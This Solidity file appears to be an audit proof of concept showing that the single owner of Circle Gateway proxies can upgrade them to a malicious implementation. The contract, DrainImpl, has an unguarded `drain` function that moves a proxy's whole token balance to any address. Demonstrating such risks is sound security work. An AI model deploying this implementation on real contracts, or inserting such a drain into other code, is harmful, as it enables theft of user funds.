// SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

/// @title DrainImpl
/// @notice A minimal UUPS-compatible implementation used ONLY on a local fork to prove that the
///         single-EOA owner of the Circle Gateway proxies can replace the implementation and drain
///         the wallet. `proxiableUUID` returns the EIP-1967 implementation slot (OZ v5 checks it on
///         the *new* implementation during `upgradeToAndCall`).
contract DrainImpl {
    bytes32 internal constant IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function proxiableUUID() external pure returns (bytes32) {
        return IMPLEMENTATION_SLOT;
    }

    /// @notice Sends the entire balance of `token` held by the proxy (address(this) == proxy) to `to`.
    function drain(address token, address to) external {
        uint256 bal = IERC20Min(token).balanceOf(address(this));
        require(IERC20Min(token).transfer(to, bal), "transfer failed");
    }
}
